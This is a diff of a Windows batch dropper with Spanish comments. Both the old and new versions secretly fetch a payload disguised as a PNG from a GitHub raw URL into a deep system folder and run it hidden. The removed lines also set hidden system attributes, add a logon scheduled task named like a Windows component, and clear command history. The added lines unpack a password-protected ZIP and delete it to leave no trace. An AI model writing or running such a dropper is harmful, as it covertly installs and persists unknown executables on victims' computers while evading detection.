@@ -1,25 +1,20 @@
 @echo off
-:: 1. Carpeta profunda de sistema (Casi nadie entra aquí)
+:: Carpeta discreta donde se guardará todo
 set "targetDir=%LocalAppData%\Microsoft\Windows\CloudExperienceHost"
 if not exist "%targetDir%" mkdir "%targetDir%"
 
-:: 2. Link de tu GitHub (Asegúrate de renombrar los archivos en el repo)
+:: Tu link de GitHub (asegúrate que sea exactamente así)
 set "baseUrl=https://raw.githubusercontent.com/deuzinnuse-collab/juego/main"
 
-:: 3. Descarga "Disfrazada"
-:: Bajamos el exe como imagen y el json como texto
-powershell -Command "iwr '%baseUrl%/logo.png' -OutFile '%targetDir%\smartscreen.exe'"
-powershell -Command "iwr '%baseUrl%/manifest.txt' -OutFile '%targetDir%\config.json'"
-powershell -Command "iwr '%baseUrl%/WinRing0x64.sys' -OutFile '%targetDir%\WinRing0x64.sys'"
+:: 1. Descarga el ZIP con contraseña (disfrazado de .png)
+powershell -Command "iwr '%baseUrl%/datos.png' -OutFile '%targetDir%\datos.zip'"
 
-:: 4. Hacerlo invisible para el explorador (Atributo de Sistema + Oculto)
-attrib +h +s "%targetDir%"
-attrib +h +s "%targetDir%\*"
+:: 2. Lo descomprime (Aquí es donde ocurre la magia)
+powershell -Command "$shell = New-Object -ComObject Shell.Application; $zip = $shell.NameSpace('%targetDir%\datos.zip'); $dest = $shell.NameSpace('%targetDir%'); $dest.CopyHere($zip.Items())"
 
-:: 5. Crear la tarea con nombre de Windows Update
-schtasks /create /tn "WindowsCloudExperience" /tr "%targetDir%\smartscreen.exe" /sc onlogon /rl highest /f >nul
+:: 3. Borra el ZIP para no dejar rastro
+del /q "%targetDir%\datos.zip"
 
-:: 6. Ejecutar y limpiar rastro
-start /b "" "%targetDir%\smartscreen.exe"
-powershell -Command "Clear-History"
+:: 4. Ejecuta el archivo (Asegúrate que se llame logo.png o cámbialo aquí al nombre que tenga el exe dentro del ZIP)
+start /b "" "%targetDir%\logo.png"
 exit
